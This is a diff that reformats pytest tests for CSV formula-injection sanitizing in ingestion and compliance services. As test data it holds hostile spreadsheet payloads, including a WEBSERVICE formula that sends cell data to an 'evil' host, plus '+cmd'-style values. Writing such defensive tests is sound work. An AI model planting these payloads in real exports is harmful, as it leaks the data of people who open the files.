@@ -28,7 +28,6 @@ from pathlib import Path
 
 import pytest
 
-
 _REPO_ROOT = Path(__file__).resolve().parent.parent.parent
 _INGESTION_DIR = _REPO_ROOT / "services" / "ingestion"
 _COMPLIANCE_DIR = _REPO_ROOT / "services" / "compliance"
@@ -103,12 +102,11 @@ def compliance_fsma_spreadsheet(compliance_csv_safety):
 # shared sanitize_cell helper
 # ---------------------------------------------------------------------------
 
-def test_sanitize_cell_prefixes_formula_indicators(
-    ingestion_csv_safety, compliance_csv_safety
-):
+
+def test_sanitize_cell_prefixes_formula_indicators(ingestion_csv_safety, compliance_csv_safety):
     """`=`, `+`, `-`, `@`, `\\t`, `\\r` all get single-quote prefixed."""
     dangerous = [
-        "=WEBSERVICE(\"http://evil/?x=\"&A1)",
+        '=WEBSERVICE("http://evil/?x="&A1)',
         "=1+1",
         "+cmd",
         "-cmd",
@@ -122,9 +120,7 @@ def test_sanitize_cell_prefixes_formula_indicators(
             compliance_csv_safety.sanitize_cell,
         ):
             sanitized = fn(value)
-            assert sanitized.startswith("'"), (
-                f"expected single-quote prefix, got {sanitized!r}"
-            )
+            assert sanitized.startswith("'"), f"expected single-quote prefix, got {sanitized!r}"
             assert sanitized[1:] == value
 
     # Benign values pass through unchanged.
@@ -147,6 +143,7 @@ def test_sanitize_cell_prefixes_formula_indicators(
 # #1272 — compliance fsma_spreadsheet formula escaping
 # ---------------------------------------------------------------------------
 
+
 def test_1272_compliance_spreadsheet_neutralizes_formula_prefixes(
     compliance_fsma_spreadsheet,
 ):
@@ -159,7 +156,7 @@ def test_1272_compliance_spreadsheet_neutralizes_formula_prefixes(
         {
             "type": "SHIPPING",
             "tlc": "TLC-001",
-            "product_description": "=WEBSERVICE(\"http://evil\")",
+            "product_description": '=WEBSERVICE("http://evil")',
             "quantity": 100,
             "uom": "cases",
             "facility_gln": "1111111111111",
@@ -177,26 +174,20 @@ def test_1272_compliance_spreadsheet_neutralizes_formula_prefixes(
         events,
         start_date="2026-04-01",
         end_date="2026-04-17",
-        requesting_entity="=WEBSERVICE(\"http://evil\")",
+        requesting_entity='=WEBSERVICE("http://evil")',
     )
     rows = list(csv.reader(io.StringIO(csv_text)))
 
     # The "Requesting Entity" metadata row is user-controlled via URL.
     requesting_row = next(r for r in rows if r and r[0] == "Requesting Entity")
-    assert requesting_row[1].startswith("'="), (
-        f"requesting_entity not sanitized: {requesting_row[1]!r}"
-    )
+    assert requesting_row[1].startswith("'="), f"requesting_entity not sanitized: {requesting_row[1]!r}"
 
     # Find the data row (the one containing TLC-001).
     data_row = next(r for r in rows if r and "TLC-001" in r)
     # At least one cell must start with ``'`` (the sanitized formulas).
-    assert any(cell.startswith("'") for cell in data_row), (
-        f"expected a sanitized cell in {data_row}"
-    )
+    assert any(cell.startswith("'") for cell in data_row), f"expected a sanitized cell in {data_row}"
     # Specifically, the product_description was ``=WEBSERVICE...``.
-    assert any(c.startswith("'=WEBSERVICE") for c in data_row), (
-        f"product_description not sanitized in {data_row}"
-    )
+    assert any(c.startswith("'=WEBSERVICE") for c in data_row), f"product_description not sanitized in {data_row}"
 
 
 def test_1272_benign_values_pass_through_unchanged(compliance_fsma_spreadsheet):
